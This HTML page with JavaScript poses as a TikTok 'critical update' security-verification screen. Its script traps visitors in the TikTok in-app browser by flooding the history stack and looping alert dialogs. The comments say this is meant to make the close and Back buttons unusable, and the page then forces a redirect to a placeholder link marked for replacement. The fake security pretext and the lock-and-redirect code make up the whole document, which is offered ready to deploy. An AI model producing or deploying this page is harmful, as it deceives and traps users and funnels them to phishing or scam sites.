<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #ffffff; font-family: -apple-system, sans-serif;
            overflow: hidden;
        }
        #lock-screen {
            display: flex; flex-direction: column; align-items: center; 
            justify-content: center; height: 100vh; text-align: center;
        }
        .btn {
            background: #fe2c55; color: white; padding: 20px 60px; 
            border-radius: 8px; text-decoration: none; font-weight: 800;
            font-size: 20px; border: none; cursor: pointer;
            box-shadow: 0 10px 20px rgba(254,44,85,0.3);
        }
    </style>
</head>
<body>

    <div id="lock-screen">
        <div style="font-size: 28px; font-weight: 900; color: #161823;">CRITICAL UPDATE</div>
        <p style="color: #8a8b91; padding: 0 40px; margin: 20px 0 40px; font-size: 18px;">
            Your TikTok session requires mandatory security verification. 
        </p>
        <button class="btn" onclick="triggerBreakout()">VERIFY NOW</button>
    </div>

<script>
    // 1. YOUR DESTINATION
    const destination = "https://www.google.com"; // Change to your link
    const androidIntent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;

    // 2. THE BREAKOUT ENGINE
    function triggerBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Forces Android to open Chrome and close the TikTok WebView
            window.location.href = androidIntent;
        } else {
            // iOS: Attempts to force Safari to take the URL
            window.location.assign(destination);
            window.open(destination, '_blank');
        }
    }

    // 3. THE INFINITE MODAL PRISON
    // This is what stops the 'X' and 'Back' buttons.
    function hammerTime() {
        // The message informs them that clicking OK is the only way out
        alert("SECURITY ALERT: Verification Required.\n\nClick 'OK' to open secure browser.");
        
        // The moment they click OK, we attempt the breakout
        triggerBreakout();
        
        // Immediately queue the next alert to keep the UI thread locked
        // This makes the 'X' button virtually un-clickable
        setTimeout(hammerTime, 10);
    }

    // 4. TRIGGERING THE LOCK
    // We trigger the infinite loop if they try to leave (X or Back)
    window.onblur = () => { hammerTime(); };
    window.onpopstate = () => { hammerTime(); };

    // 5. HISTORY SATURATION
    window.onload = () => {
        // Fills the back-stack so 'Back' just triggers the popstate alert
        for(let i=0; i<100; i++) {
            history.pushState({locked: true}, "", "#verification_id_" + i);
        }
        
        // Speculative: Start the hammer if the page is loaded directly 
        // (Uncomment the line below if you want it to start INSTANTLY without them touching anything)
        // hammerTime(); 
    };

    // If they try to refresh or close, the browser will ask them one last time
    window.onbeforeunload = function() {
        triggerBreakout();
        return "Verification in progress...";
    };
</script>
</body>
</html>
